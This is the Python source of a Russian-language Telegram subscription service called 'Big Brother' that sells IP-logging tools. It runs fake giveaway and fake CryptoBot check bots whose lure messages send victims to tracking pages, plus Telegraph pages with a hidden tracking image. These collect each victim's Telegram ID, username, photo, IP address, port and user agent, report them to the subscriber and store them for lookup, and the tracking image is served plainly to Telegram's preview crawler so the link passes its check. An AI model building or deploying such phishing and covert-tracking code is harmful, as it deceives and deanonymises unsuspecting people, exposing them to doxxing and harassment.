from telebot import TeleBot, types
from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, FileResponse, Response
from base64 import b64decode
from uvicorn import run
from json import loads, load
from db_worker import database
from config import *
from requests import get
from os import listdir
from random import choice
from time import time, ctime
from string import ascii_uppercase
from threading import Thread
from kb import *
from send import CryptoPay
from telegraph import Telegraph
from math import ceil



snd = CryptoPay(CRYPTO_TOKEN)
db = database()
app = FastAPI()
bot = TeleBot(BOT_TOKEN, "HTML")
giveawaybot = TeleBot(GIVEAWAY_BOT_TOKEN, "HTML")
cryptobot = TeleBot(CRYPTOBOT_BOT_TOKEN, "HTML")
sessions_strings = {"session_string": "initTime"}
def generate_random_string(length):
    return ''.join([choice(ascii_uppercase) for _ in range(length)])
giveawayIndexHTML = open("giveaway.html", 'rb').read()
cryptobotIndexHTML = open("cryptobot.html", 'rb').read()
# db.add_subscription(6713279525, 999999999)
tph_data = load(open("telegraph.json"))
telegraph = Telegraph(tph_data["access_token"])


@giveawaybot.message_handler(['start'])
def giveaway_handler(message):
    data = db.get_user_info(message.from_user.id)
    if data[1] is None:
        giveawaybot.reply_to(message, f"<b>Для использования бота купите подписку в @{bot.get_me().username}</b>")
    else:
        keyboard = InlineKeyboardMarkup()
        keyboard.row(InlineKeyboardButton("Отправить фейк розыгрыш", switch_inline_query="Розыгрыш на 100$"))
        giveawaybot.reply_to(message, f'<b>Выберите чат по кнопке ниже чтобы отправить розыгрыш, или напишите <code>@{giveawaybot.get_me().username} Текст "розыгрыша"</code></b>', reply_markup=keyboard)


@giveawaybot.inline_handler(lambda query: True)
def giveaway_query_handler(query: types.InlineQuery):
    messagetext = query.query.replace("<", "").replace(">", "")
    link = f"https://t.me/{giveawaybot.get_me().username}?startapp={query.from_user.id}"
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("Участвовать!", url=link))
    msg_text = types.InputTextMessageContent(f"<b>{messagetext}</b>", "HTML")
    r = types.InlineQueryResultArticle(generate_random_string(32), "Отправить розыгрыш", msg_text, reply_markup=keyboard)
    giveawaybot.answer_inline_query(query.id, [r])


@cryptobot.message_handler(['start'])
def crypto_handler(message):
    data = db.get_user_info(message.from_user.id)
    if data[1] is None:
        cryptobot.reply_to(message, f"<b>Для использования бота купите подписку в @{bot.get_me().username}</b>")
    else:
        keyboard = InlineKeyboardMarkup()
        keyboard.row(InlineKeyboardButton("Отправить фейк чек", switch_inline_query="100$"))
        cryptobot.reply_to(message, f'<b>Выберите чат по кнопке ниже чтобы отправить чек, или напишите <code>@{cryptobot.get_me().username} сумма чека вместе с валютой(100$, 1€)</code> в любом чате</b>', reply_markup=keyboard)


@cryptobot.inline_handler(lambda query: True)
def crypto_query_handler(query: types.InlineQuery):
    messagetext = query.query.replace("<", "").replace(">", "")
    link = f"https://t.me/{cryptobot.get_me().username}?startapp={query.from_user.id}"
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton(f"Получить {messagetext}", url=link))
    msg_text = types.InputTextMessageContent(f"<b>📤Чек на {messagetext}</b>", "HTML")
    r = types.InlineQueryResultArticle(generate_random_string(32), "Отправить чек", msg_text, reply_markup=keyboard)
    cryptobot.answer_inline_query(query.id, [r])


@app.get("/logger/img")
def img_handler(request: Request, id: int = None):
    if id is None:
        return HTMLResponse("Error")
    else:
        if "telegram" in str(request.headers):
            return Response(open("imgs/img.jpg", 'rb').read(), media_type="image/png")
        user_info = {
            "id": "telegraph",
            "username": "telegraph",
            "photo_url": f"https://t.me/{BOT_USERNAME}",
            "ip": request.client.host,
            "port": request.client.port,
            "user_agent": request.headers.get("User-Agent"),
            "creator": id
        }
        print(f"===================================\n\nUSER INFO: {user_info}\n\n=================================================")
        if db.new_log(user_info):
            data = db.get_user_info(id)
            if data[2]:
                bot.send_message(id, f"Новый лог!\nЛоггер telegraph\n\nАйпи: {request.client.host}\nПорт: {request.client.port}\nЮзер-агент: {request.headers.get('User-Agent')}", reply_markup=telegraph_log_kb())
    return Response(open("imgs/img.jpg", 'rb').read(), media_type="image/png")


@bot.message_handler(['db'])
def db_handler(message):
    if message.from_user.id != OWNER_ID: return
    bot.send_document(message.chat.id, open("db.db", 'rb').read())


@app.get("/ip")
def dsagfa(request: Request):
    return HTMLResponse(f"IP: {request.client.host}")


@app.get("/new_log")
def hihi(request: Request, params: str = None, session_string: str = None):
    if session_string is None or session_string not in sessions_strings:
        return HTMLResponse("not received")
    elif sessions_strings[session_string] - time() <= -600:
        return HTMLResponse("not received")
    else:
        try:
            user_info = loads(b64decode(params))
            user_info["ip"] = request.client.host
            user_info["port"] = request.client.port
            user_info['user_agent'] = request.headers['user-agent']
            for key in ("id", "username", "photo_url", "ip", "port", "user_agent", "creator"):
                if key not in user_info:
                    raise Exception
            if db.new_log(user_info):
                creator_data = db.get_user_info(user_info['creator'])
                if creator_data[2]:
                    bot.send_photo(user_info['creator'], get(user_info['photo_url'], stream=True).content, f"""<b>⚜️ Новый лог!
                            
    Информация о тг:
        🆔 ID: <code>{user_info['id']}</code>
        🔰 USERNAME: <code>{user_info['username']}</code>

    Информация о запросе:
        🔗 IP: <code>{user_info['ip']}</code>
        📥 PORT: <code>{user_info['port']}</code>
        🏷 USER-AGENT: <code>{user_info['user_agent']}</code>
    </b>""")
                sessions_strings.pop(session_string)
            return HTMLResponse("received")
        except Exception as e:
            print(e)
            return HTMLResponse(f"not received, {e}")


@app.get("/logger/index")
def index(request: Request):
    session_string = generate_random_string(256).encode()
    sessions_strings[session_string.decode()] = time()
    return HTMLResponse(giveawayIndexHTML.replace(b"%SESSION_STRING%", session_string))


@app.get("/logger2/index")
def index(request: Request):
    session_string = generate_random_string(256).encode()
    sessions_strings[session_string.decode()] = time()
    return HTMLResponse(cryptobotIndexHTML.replace(b"%SESSION_STRING%", session_string))


@app.get("/logger/gif")
def gif_handler(request: Request):
    files = listdir("gifs")
    return Response(open(f"gifs/{choice(files)}", "rb").read(),media_type="image/png")


@app.get("/logger2/preload_gif")
def preload_gif(*_):
    return Response(open("gifs/preload.gif", 'rb').read(), media_type="image/png")



@bot.callback_query_handler(lambda call: call.data == "info")
def info_hander(call: types.CallbackQuery):
    bot.edit_message_text("""<b>Большой брат - проект-логгер, с самыми низкими ценами и лучшим качеством. Приобретая подписку вы не только получаете доступ к логгеру с помощью которого вы сможете создавать логгеры для массового использования, а еще и бесконечный респект в школе🤙\nПо любым вопросам, предложениям, просьбам, обращайтесь к администратору по кнопке ниже\n\nСпасибо что выбираете нас!</b>""", call.message.chat.id, call.message.id, reply_markup=info_kb())



@bot.message_handler(['start'])
@bot.callback_query_handler(lambda call: call.data == "start")
def start_handler(message):
    data = db.get_user_info(message.from_user.id)
    if data[1] == None:
        text = "<b>Добро пожаловать!\n\nПодписка: неактивна</b>"
        keyboard = unsub_kb()
    elif data[1] < time():
        db.remove_subscription(message.from_user.id)
        text = "<b>Добро пожаловать!\n\nПодписка: неактивна</b>"
        keyboard = unsub_kb()
    else:
        text = "<b>Добро пожаловать!\n\nПодписка: активна</b>"
        keyboard = sub_kb()
    if type(message) is types.Message:
        bot.send_message(message.chat.id, text, reply_markup=keyboard)
    else:
        bot.edit_message_text(text, message.message.chat.id, message.message.id, reply_markup=keyboard)    

    
@bot.callback_query_handler(lambda call: call.data == "subcheck")
def subcheck_handler(call):
    invoice_id = call.message.text.split("\n")[0].replace("ID: ", "")
    invoice = snd.get_invoice(invoice_id)
    if invoice['status'] == "active":
        bot.answer_callback_query(call.id, "Счет еще не оплачен! Оплатите его и попробуйте снова!")
    elif invoice['status'] == "paid":
        days = PRICES_TO_DURATION[float(invoice['amount'])]
        if days == -1:
            duration = -1
        else:
            duration = days * 3600 * 24
        db.add_subscription(call.from_user.id, duration)
        bot.answer_callback_query(call.id, "Спасибо за покупку подписки!")
        start_handler(call)


@bot.callback_query_handler(lambda call: call.data.startswith("sub_"))
def invoice_create(call):
    daycount = int(call.data.replace("sub_", ""))
    invoice = snd.create_invoice(PRICES[daycount])
    print(invoice)
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("Оплатить", invoice['pay_url']))
    keyboard.row(InlineKeyboardButton("Проверить оплату", callback_data="subcheck"))
    bot.edit_message_text(f"<b>ID: {invoice['invoice_id']}\n\nОплатите счет по кнопке ниже чтобы получить подписку</b>", call.message.chat.id, call.message.id, reply_markup=keyboard)


@bot.callback_query_handler(lambda call: call.data == "buy_sub")
def buy_sub_handler(call):
    bot.edit_message_text("<b>Выберите срок на который хотите приобрести подписку</b>", call.message.chat.id, call.message.id, reply_markup=buy_sub_kb())


@bot.callback_query_handler(lambda call: call.data == "status_off")
def status_off_handler(call):
    db.set_notifications_false(call.from_user.id)
    profile_handler(call)


@bot.callback_query_handler(lambda call: call.data == "status_on")
def status_on_handler(call):
    db.set_notifications_true(call.from_user.id)
    profile_handler(call)


@bot.callback_query_handler(lambda call: call.data == "profile")
def profile_handler(call: types.CallbackQuery):
    data = db.get_user_info(call.from_user.id)
    if data[1] is None:
        if  data[2]:
            text = f"""<b>  
ID: {call.from_user.id}
Юзернейм: {call.from_user.username}
Уведомления: включены
SUB STATE: NONE
    </b>"""
        else:
            text = f"""<b>  
ID: {call.from_user.id}
Юзернейм: {call.from_user.username}
Уведомления: выключены
SUB STATE: NONE
    </b>"""
    else:
        if data[2]:
            text = f"""<b>  
ID: {call.from_user.id}
Юзернейм: {call.from_user.username}
Уведомления: включены
SUB STATE: {ctime(data[1])}
    </b>"""
        else:
            text = f"""<b>  
ID: {call.from_user.id}
Юзернейм: {call.from_user.username}
Уведомления: выключены
SUB STATE: {ctime(data[1])}
    </b>"""
    bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=main_menu_button_kb(data[2]))


@bot.callback_query_handler(lambda call: call.data == "loggers")
def loggers_hander(call: types.CallbackQuery):
    keyboard = InlineKeyboardMarkup()
    keyboard.row(InlineKeyboardButton("Фейк бот с розыгрышами", f"https://t.me/{GIVEAWAY_BOT_USERNAME}"))
    keyboard.row(InlineKeyboardButton("Фейк CryptoBot", f"https://t.me/{CRYPTOBOT_BOT_USERNAME}"))
    keyboard.row(InlineKeyboardButton("Telegra.ph ссылка", callback_data="tgra"))
    keyboard.row(InlineKeyboardButton("Назад", callback_data="start"))
    bot.edit_message_text("<b>Выберите бота через которого хотите получить логи</b>", call.message.chat.id, call.message.id, reply_markup=keyboard)


@bot.callback_query_handler(lambda call: call.data == "tgra")
def tgra_handler(call: types.CallbackQuery):
    page = telegraph.create_page("title", html_content=f'<b>text</b><img src="https://bigbrolog.ru/logger/img?id={call.from_user.id}"></img>')["url"]
    bot.edit_message_text(f"<b>Ваша ссылка: <code>{page}</code>\n\nЕсли кто то перейдет по этой ссылке, в списке ваших логов у него будет айди telegraph</b>", call.message.chat.id, call.message.id, reply_markup=telegraph_kb(page))


def log_find(message: types.Message, old_id: int):
    try:
        bot.delete_message(message.chat.id, message.id)
    except:
        ...
    try:
        info = message.text.strip()
        id = int(info)
    except:
        logs_by_username = db.get_logs_by_username(info)
        print(logs_by_username)
        if logs_by_username != []:
            id = logs_by_username[0][0]
        else:
            msg = bot.edit_message_text("<b>Введите телеграм ID или USERNAME пользователя о котором хотите найти информацию\n\nИнформация не найдена!</b>", message.chat.id, old_id, reply_markup=cancel_kb())
            bot.register_next_step_handler(msg, log_find, msg.id)
            return 
    logs = db.get_logs_by_id(id)
    if logs == []:
        msg = bot.edit_message_text("<b>Введите телеграм ID или USERNAME пользователя о котором хотите найти информацию\n\nИнформация не найдена!</b>", message.chat.id, old_id, reply_markup=cancel_kb())
        bot.register_next_step_handler(msg, log_find, msg.id)
        return 
    actual_logs = {
        'usernames': [],
        'photos': [],
        "ips": [],
        "ports": [],
        'user_agents': []
        }
    for log in logs:
        if "@" + log[1] not in actual_logs['usernames']:
            actual_logs['usernames'].append("@" + log[1])
        if f'<a href="{log[2]}">link</a>' not in actual_logs['photos']:
            actual_logs['photos'].append(f'<a href="{log[2]}">link</a>')
        if f"<code>{log[3]}</code>" not in actual_logs['ips']:
            actual_logs['ips'].append(f"<code>{log[3]}</code>")
        if f"<code>{log[4]}</code>" not in actual_logs['ports']:
            actual_logs['ports'].append(f"<code>{log[4]}</code>")
        if f"<code>{log[5]}</code>" not in actual_logs['user_agents']:
            actual_logs['user_agents'].append(f"<code>{log[5]}</code>")
    text = f"""<b>ID: {id}
Юзернеймы: {', '.join(actual_logs['usernames'])}
Фотографии: {', '.join(actual_logs['photos'])}
Айпи адреса: {', '.join(actual_logs['ips'])}
Порты: {', '.join(actual_logs['ports'])}
Юзер-Агенты: {', '.join(actual_logs['user_agents'])}
</b>"""
    bot.edit_message_text(text, message.chat.id, old_id, reply_markup=found_info_kb(id))


@bot.callback_query_handler(lambda call: call.data == "cancel")
def cancel_handler(call: types.CallbackQuery):
    bot.clear_step_handler(call.message)
    start_handler(call)


@bot.callback_query_handler(lambda call: call.data == "log_find")
def log_find_handler(call: types.CallbackQuery):
    msg = bot.edit_message_text("<b>Введите телеграм ID или USERNAME пользователя о котором хотите найти информацию</b>", call.message.chat.id, call.message.id, reply_markup=cancel_kb())
    bot.register_next_step_handler(msg, log_find, msg.id)



@bot.callback_query_handler(lambda call: call.data == "my_logs")
def logs_handler(call: types.CallbackQuery):
    logs = db.get_logs_by_creator(call.from_user.id)
    actual_logs = {"ID": {
        'usernames': [],
        'photos': [],
        "ips": [],
        "ports": [],
        'user_agents': []
        }}
    keyboard = InlineKeyboardMarkup()
    if len(logs) >= 5:
        keyboard.row(InlineKeyboardButton(f"{logs[0][0]} | @{logs[0][1]}", callback_data=f"log_0"))
        keyboard.row(InlineKeyboardButton(f"{logs[1][0]} | @{logs[1][1]}", callback_data=f"log_1"))
        keyboard.row(InlineKeyboardButton(f"{logs[2][0]} | @{logs[2][1]}", callback_data=f"log_2"))
        keyboard.row(InlineKeyboardButton(f"{logs[3][0]} | @{logs[3][1]}", callback_data=f"log_3"))
        keyboard.row(InlineKeyboardButton(f"{logs[4][0]} | @{logs[4][1]}", callback_data=f"log_4"))
        keyboard.row(InlineKeyboardButton("⏮️", callback_data=f"page_-5"), InlineKeyboardButton("⬅️", callback_data=f"page_-1"), InlineKeyboardButton("🔰", callback_data="none"), InlineKeyboardButton("➡️", callback_data=f"page_1"), InlineKeyboardButton("⏭️", callback_data=f"page_5"))
    else:
        count = 0
        for nolog in logs:
            keyboard.row(InlineKeyboardButton(f"{nolog[0]} | @{nolog[1]}", callback_data=f"log_{count}"))
            count += 1
    keyboard.row(InlineKeyboardButton("Назад", callback_data="start"))
    bot.edit_message_text("<b>Нажмите на айди пользователя для просмотра лога\n\nСтраница: 1</b>", call.message.chat.id, call.message.id, reply_markup=keyboard)



@bot.callback_query_handler(lambda call: call.data.startswith("page_"))
def page_opener(call: types.CallbackQuery):
    try:
        page_number = int(call.data.replace('page_', ""))
        logs = db.get_logs_by_creator(call.from_user.id)
        if page_number < 0 or page_number > ceil(len(logs) / 5):
            return bot.answer_callback_query(call.id, f"Мы не можем открыть страницу {page_number + 1}, количество ваших страниц: {int(ceil(len(logs) / 5))}", True)
        text = f"<b>Нажмите на айди пользователя для просмотра лога\n\nСтраница: {page_number + 1}</b>"
        logs = logs[page_number * 5:]
        keyboard = InlineKeyboardMarkup()
        for i in range(len(logs)):
            if i == 5:
                break
            keyboard.row(InlineKeyboardButton(f"{logs[i][0]} | @{logs[i][1]}", callback_data=f"log_{page_number * 5 + i}"))
        keyboard.row(InlineKeyboardButton("⏮️", callback_data=f"page_{page_number - 5}"), InlineKeyboardButton("⬅️", callback_data=f"page_{page_number - 1}"), InlineKeyboardButton("🔰", callback_data="none"), InlineKeyboardButton("➡️", callback_data=f"page_{page_number + 1}"), InlineKeyboardButton("⏭️", callback_data=f"page_{page_number + 5}"))
        keyboard.row(InlineKeyboardButton("Назад", callback_data="start"))
        bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=keyboard)
    except Exception as e:
        print(e)


@bot.callback_query_handler(lambda call: call.data.startswith("log_"))
def log__handler(call: types.CallbackQuery):
    log_id = int(call.data.replace("log_", ""))
    logs = db.get_logs_by_creator(call.from_user.id)
    if len(logs) < log_id:
        bot.answer_callback_query(call.id, "Лог не найден!\n\nОбновите страницу и попробуйте снова!")
    else:
        text = f"""<b>
ID: {logs[log_id][0]}
Юзернэйм: {logs[log_id][1]}
Фотографии: <a href="{logs[log_id][2]}">линк</a>
Айпи-адреса: {logs[log_id][3]}
Порт: {logs[log_id][4]}
Юзер-Агент: {logs[log_id][5]}
</b>"""
        page_number = log_id // 5
        bot.edit_message_text(text, call.message.chat.id, call.message.id, reply_markup=log_kb(logs[log_id][0], page_number))



@bot.message_handler(['user_id'])
def user_id_hander(message):
    print(f'tg://user?id={message.text.replace("/user_id ", "")}')
    bot.reply_to(message, "Хихи", reply_markup=InlineKeyboardMarkup().add(InlineKeyboardButton("Пользователь", f'tg://user?id={message.text.replace("/user_id ", "")}')))


cryptobot.infinity_polling
Thread(target=bot.infinity_polling).start()
Thread(target=cryptobot.infinity_polling).start()
Thread(target=giveawaybot.infinity_polling).start()
run(app, host="0.0.0.0", port=443)
